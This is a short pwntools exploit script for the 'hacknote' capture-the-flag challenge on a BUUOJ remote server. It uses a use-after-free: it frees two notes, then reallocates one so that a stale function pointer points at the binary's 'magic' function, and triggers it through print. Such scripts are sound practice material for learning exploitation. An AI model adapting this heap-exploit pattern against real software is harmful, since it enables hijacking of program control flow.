from pwn import *

#p = process('./hacknote')
p = remote('node4.buuoj.cn', 29937)
elf = ELF('hacknote')

magic = elf.sym['magic']

def add(size, content):
	p.sendlineafter("Your choice :", str(1))
	p.sendlineafter("Note size :", str(int(size)))
	p.sendlineafter("Content :", content)

def delete(index):
	p.sendlineafter("Your choice :", str(2))
	p.sendlineafter("Index :", str(index))

def printn(index):
	p.sendlineafter("Your choice :", str(3))
	p.sendlineafter("Index :", str(index))

add(0x10, b'b')
add(0x10, b'b')
delete(0)
delete(1)

add(0x8, p32(magic))

#gdb.attach(p, 'b *0x804893a')

printn(0)

p.interactive()
